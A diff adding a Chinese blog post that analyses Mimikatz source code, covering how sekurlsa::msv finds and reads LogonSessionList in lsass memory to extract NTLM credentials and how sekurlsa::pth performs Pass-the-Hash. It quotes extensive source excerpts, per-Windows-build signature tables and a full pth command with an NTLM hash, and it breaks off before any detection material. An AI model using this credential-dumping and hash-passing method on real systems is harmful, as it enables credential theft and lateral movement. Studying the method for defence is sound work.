@@ -589,6 +589,414 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2022/04/22/Mimikatz原理分析和检测/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/04/22/Mimikatz原理分析和检测/" itemprop="url">Mimikatz原理分析和检测</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-22T14:02:11+08:00">
+                2022-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防技术/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="sekurlsa-msv源码分析"><a href="#sekurlsa-msv源码分析" class="headerlink" title="sekurlsa::msv源码分析"></a>sekurlsa::msv源码分析</h2><ul>
+<li>Mimikatz的sekurlsa::msv命令是用于获取NTLM协议加密的凭证</li>
+<li>其在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中实现。</li>
+<li>具体原理是通过特征码定位Lsass.exe进程的lsasvr.dll中的LogonSessionList全局变量和LogonSessionListCount全局变量的地址，然后解析LogonSessionList结构体即可，LogonSessionList是一个双向链表(LIST_ENTRY)。</li>
+<li><p>在NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中，首先调用kuhl_m_sekurlsa_acquireLSA()函数用于获取相关模块信息，主要是在kull_m_process_getVeryBasicModuleInformations()函数中，通过PEB获取指定的lsasvr.dll基地址。</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">moduleInformation.NameDontUseOutsideCallback</span> = &amp;moduleName<span class="comment">;</span></div><div class="line"><span class="symbol">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line">	aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrData; </span>aProcess.<span class="keyword">address </span>= Peb.<span class="keyword">Ldr;</span></div><div class="line"><span class="keyword">	</span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrData)))</span></div><div class="line"><span class="keyword">	</span>&#123;</div><div class="line">		for(</div><div class="line">			aLire  = (PBYTE) (<span class="keyword">LdrData.InMemoryOrderModulevector.Flink) </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks),</div><div class="line">			fin    = (PBYTE) (Peb.<span class="keyword">Ldr) </span>+ FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector)<span class="comment">;</span></div><div class="line">			(aLire != fin) &amp;&amp; continueCallback<span class="comment">;</span></div><div class="line">			aLire  = (PBYTE) <span class="keyword">LdrEntry.InMemoryOrderLinks.Flink </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks)</div><div class="line">			)</div><div class="line">		&#123;</div><div class="line">			aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrEntry; </span>aProcess.<span class="keyword">address </span>= aLire<span class="comment">;</span></div><div class="line">			<span class="meta">if</span>(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrEntry)))</span></div><div class="line"><span class="keyword">	</span>		&#123;</div><div class="line">				moduleInformation.DllBase.<span class="keyword">address </span>= <span class="keyword">LdrEntry.DllBase;</span></div><div class="line"><span class="keyword">	</span>			moduleInformation.SizeOfImage = <span class="keyword">LdrEntry.SizeOfImage;</span></div><div class="line"><span class="keyword">	</span>			moduleName = <span class="keyword">LdrEntry.BaseDllName;</span></div><div class="line"><span class="keyword">	</span>			<span class="meta">if</span>(moduleName.<span class="keyword">Buffer </span>= (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))</div><div class="line">				&#123;</div><div class="line">					aBuffer.<span class="keyword">address </span>= moduleName.<span class="keyword">Buffer; </span>aProcess.<span class="keyword">address </span>= <span class="keyword">LdrEntry.BaseDllName.Buffer;</span></div><div class="line"><span class="keyword">	</span>				<span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))</div><div class="line">					&#123;</div><div class="line">						kull_m_process_adjustTimeDateStamp(&amp;moduleInformation)<span class="comment">;</span></div><div class="line">						continueCallback = callBack(&amp;moduleInformation, pvArg)<span class="comment">;</span></div><div class="line">					&#125;</div><div class="line">					LocalFree(moduleName.<span class="keyword">Buffer);</span></div><div class="line"><span class="keyword">	</span>			&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		status = STATUS_SUCCESS<span class="comment">;</span></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后通过kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList全局变量和LogonSessionListCount全局变量的地址,其中LsaSrvReferences数组存储着不同系统版本的索引特征码(位于kuhl_m_sekurlsa_utils.c文件中)</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)</div><div class="line">&#123;</div><div class="line">	PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);</div><div class="line">	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);</div><div class="line">&#125;</div><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">	&#123;KULL_M_WIN_BUILD_XP,		&#123;sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_2K3,		&#123;sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_VISTA,	&#123;sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_7,		&#123;sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_8,		&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_BLUE,		&#123;sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1507,	&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1703,	&#123;sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1803,	&#123;sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1903,	&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_2022,		&#123;sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+</li>
+<li><p>此时LogonSessionListCount，LogonSessionList两个变量，仅仅表示的是其在内存中的地址。需要通过kull_m_memory_copy获取其值。</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="title">securityStruct</span>.hMemory = cLsass.hLsassMem;</div><div class="line"><span class="title">if</span>(securityStruct.address = <span class="type">LogonSessionListCount</span>)       </div><div class="line">	kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">ULONG</span>));   //<span class="keyword">data</span>-&gt;address 保存的是<span class="type">LogonSessionListCount</span>的值</span></div><div class="line"><span class="title">for</span>(i = <span class="number">0</span>; i &lt; nbListes; i++)</div><div class="line">&#123;</div><div class="line">	securityStruct.address = &amp;<span class="type">LogonSessionList</span>[i];</div><div class="line">	<span class="class"><span class="keyword">data</span>.address = &amp;pStruct;</span></div><div class="line">	<span class="class"><span class="keyword">data</span>.hMemory = &amp;<span class="type">KULL_M_MEMORY_GLOBAL_OWN_HANDLE</span>;</span></div><div class="line">	<span class="keyword">if</span>(aBuffer.address = <span class="type">LocalAlloc</span>(<span class="type">LPTR</span>, helper-&gt;tailleStruct))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">PVOID</span>)))   //securityStruct.address 保存的是<span class="type">LogonSessionList</span>数组地址</span></div><div class="line"> .....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后第三次调用kull_m_memory_copy()函数，获取双向链表的第一个节点,aBuffer.address就是第一个节点的地址。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;<span class="keyword">data</span>, helper-&gt;</span>tailleStruct))<span class="comment">//aBuffer.address指向的是LogonSessionList双向列表的某个节点</span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="title">sessionData</span>.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLuid);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonType));</div><div class="line">	<span class="function"><span class="title">sessionData</span>.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper-&gt;</span>offsetToSession));</div><div class="line">	<span class="function"><span class="title">sessionData</span>.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToUsername);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToDomain);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentials);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper-&gt;</span>offsetToPSid);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentialManager);</div><div class="line">	<span class="function"><span class="title">sessionData</span>.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonTime));</div><div class="line">	<span class="function"><span class="title">sessionData</span>.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonServer);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p> <img src="http://hacky.wang/blog/20220215/7ozemelppDsx.png?imageslim" alt="mark"></p>
+</li>
+</ul>
+<h2 id="Pass-the-Hash攻击-传递Hash攻击"><a href="#Pass-the-Hash攻击-传递Hash攻击" class="headerlink" title="Pass the Hash攻击(传递Hash攻击)"></a>Pass the Hash攻击(传递Hash攻击)</h2><ul>
+<li><p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证(攻击者无须通过解密hash值来获取明文密码。)，以此来横向访问其他网络系统。 </p>
+</li>
+<li><p>在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存,凭据管理器(CredManage),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p>
+</li>
+<li><p>但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p>
+</li>
+</ul>
+<h2 id="sekurlsa-pth源码分析"><a href="#sekurlsa-pth源码分析" class="headerlink" title="sekurlsa::pth源码分析"></a>sekurlsa::pth源码分析</h2><ul>
+<li>Mimikatz的sekurlsa::pth命令主要用户进行Pass The Hash攻击，其实现在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的kuhl_m_sekurlsa_pth函数。</li>
+<li>命令如下：<code>sekurlsa::pth /user:Administrator /domain:192.168.230.129 /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></li>
+<li><p>首先将分别解析命令行所传递的参数，</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"luid"</span>, &amp;szLuid, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">	tokenStats.AuthenticationId.HighPart = <span class="number">0</span>; <span class="comment">// because I never saw it != 0</span></div><div class="line">	tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"user"</span>, &amp;szUser, <span class="literal">NULL</span>))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"domain"</span>, &amp;szDomain, <span class="literal">NULL</span>))</div><div class="line">		&#123;</div><div class="line">			isImpersonate = kull_m_string_args_byName(argc, argv, <span class="string">L"impersonate"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">			kull_m_string_args_byName(argc, argv, <span class="string">L"run"</span>, &amp;szRun, isImpersonate ? _wpgmptr : <span class="string">L"cmd.exe"</span>);</div><div class="line">			kprintf(<span class="string">L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n"</span>, szUser, szDomain, szRun, isImpersonate ? <span class="string">L"yes"</span> : <span class="string">L"no"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : domain\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : user\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>关于散列，一共可以有4种不同的类型可以选择，分别是aes128，aes256，ntlm，rc4。</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, L<span class="string">"rc4"</span>, &amp;szNTLM, <span class="built_in">NULL</span>) || kull_m_string_args_byName(argc, argv, L<span class="string">"ntlm"</span>, &amp;szNTLM, <span class="built_in">NULL</span>))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">data</span>.NtlmHash = ntlm;</div><div class="line">		kprintf(L<span class="string">"NTLM\t: "</span>); kull_m_string_wprintf_hex(<span class="built_in">data</span>.NtlmHash, LM_NTLM_HASH_LENGTH, <span class="number">0</span>); kprintf(L<span class="string">"\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> PRINT_ERROR(L<span class="string">"ntlm hash/rc4 key length must be 32 (16 bytes)\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>接着，调用kull_m_process_create()函数，kull_m_process_create()函数参数主要有</p>
+<ul>
+<li>szRun：需要运行的程序</li>
+<li>szUser：用户名</li>
+<li>szDomain：域</li>
+<li>szPassword：密码(此处密码为空)<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(<span class="name">kull_m_process_create</span>(<span class="name">KULL_M_PROCESS_CREATE_LOGON</span>, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L<span class="string">""</span>, <span class="symbol">&amp;processInfos</span>, FALSE))</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>在kull_m_process_create()函数中，调用CreateProcessWithLogonW()创建一个进程。CreateProcessWithLogonW可以使用指定的凭证信息创建进程。但是传递的Password值是空的，以便后续填充。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">case</span> <span class="attr">KULL_M_PROCESS_CREATE_LOGON:</span></div><div class="line">	<span class="string">status</span> <span class="string">=</span> <span class="string">CreateProcessWithLogonW(user,</span> <span class="string">domain,</span> <span class="string">password,</span> <span class="string">iLogonFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">dupCommandLine,</span> <span class="string">iProcessFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">&amp;startupInfo,</span> <span class="string">ptrProcessInfos);</span></div><div class="line">	<span class="string">break;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>接着调用kuhl_m_sekurlsa_pth_luid()函数，kuhl_m_sekurlsa_pth_luid()携带的参数是一个PSEKURLSA_PTH_DATA结构，其中包含6个成员。LogonId为登录的id，NtlmHash为NTLM散列，也就是常规Pth传入的值。</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _SEKURLSA_PTH_DATA &#123; </div><div class="line">	<span class="type">PLUID</span>		<span class="type">LogonId</span>;</div><div class="line">	<span class="type">LPBYTE</span>		<span class="type">NtlmHash</span>;</div><div class="line">	<span class="type">LPBYTE</span>		<span class="type">Aes256Key</span>;</div><div class="line">	<span class="type">LPBYTE</span>		<span class="type">Aes128Key</span>;</div><div class="line">	<span class="type">BOOL</span>		isReplaceOk;</div><div class="line">&#125; <span class="type">SEKURLSA_PTH_DATA</span>, *<span class="type">PSEKURLSA_PTH_DATA</span>;</div></pre></td></tr></table></figure>
+</li>
+<li><p>kuhl_m_sekurlsa_pth_luid()首先会调用kuhl_m_sekurlsa_acquireLSA()，该函数首先会遍历Lsass.exe进程的模块，根据不同的sekurlsa模块不同的命令，选择不同的模块。例如msv命令就是寻找lsasvr.dll这个模块<br>  <img src="http://hacky.wang/blog/20220217/3PHnIpOeBOLI.png?imageslim" alt="mark"></p>
+</li>
+<li><p>kuhl_m_sekurlsa_acquireLSA()主要调用kull_m_process_getVeryBasicModuleInformations()函数通过PEB的Ldr列表获取指定模块的信息，主要是模块的基地址。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line">	<span class="keyword">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">	&#123;</div><div class="line">		<span class="function"><span class="title">for</span>(pLdrEntry  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr-&gt;</span>InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));</div><div class="line">			(pLdrEntry != (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector))) &amp;&amp; continueCallback;</div><div class="line">			<span class="function"><span class="title">pLdrEntry</span>  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (pLdrEntry-&gt;</span>InMemoryOrderLinks.Flink ) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))</div><div class="line">				)</div><div class="line">			&#123;</div><div class="line">				<span class="function"><span class="title">moduleInformation</span>.DllBase.address = pLdrEntry-&gt;</span>DllBase;</div><div class="line">				<span class="function"><span class="title">moduleInformation</span>.SizeOfImage = pLdrEntry-&gt;</span>SizeOfImage;</div><div class="line">				<span class="function"><span class="title">moduleInformation</span>.NameDontUseOutsideCallback = &amp;pLdrEntry-&gt;</span>BaseDllName;</div><div class="line">				kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);</div><div class="line">				continueCallback = callBack(&amp;moduleInformation, pvArg);</div><div class="line">			&#125;</div><div class="line">			status = STATUS_SUCCESS;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>  <img src="http://hacky.wang/blog/20220217/CXUrtKPGnsJt.png?imageslim" alt="mark"></p>
+</li>
+<li><p>调用kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList的特征码，LogonSessionList结构体包含了登录会话的诸多信息。其主要会调用kuhl_m_sekurlsa_utils_search_generic()函数。</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">	&#123;KULL_M_WIN_BUILD_XP,		&#123;sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_2K3,		&#123;sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_VISTA,	&#123;sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_7,		&#123;sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_8,		&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_BLUE,		&#123;sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1507,	&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1703,	&#123;sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1803,	&#123;sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1903,	&#123;sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_2022,		&#123;sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList&#125;,	&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+</li>
+<li><p>首先调用kull_m_patch_getGenericFromBuild()函数，其会根据系统版本选择指定的特征码。</p>
